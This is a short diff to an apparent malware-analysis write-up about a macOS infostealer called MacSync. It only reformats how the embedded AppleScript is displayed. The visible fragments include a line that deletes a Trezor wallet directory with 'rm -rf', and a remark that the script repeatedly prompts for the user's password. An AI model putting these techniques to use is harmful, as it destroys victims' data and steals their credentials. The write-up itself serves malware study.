@@ -85,8 +85,7 @@ fi
 
 <details>
   <summary>MacSync Infostealing script (click to expand)</summary>
-	
-```applescript
+  <pre><code class="language-applescript">
 on filesizer(paths)
 	set fsz to 0
 	try
@@ -705,9 +704,8 @@ if trezor_installed then
         do shell script "rm -rf " & quoted form of TREZORPATH
     end try
 end if
-```
+  </code></pre>
 </details>
-
 
 Upon execution, the script prompts the user the enter their password, and will repeatedly ask until the correct password is entered.
 
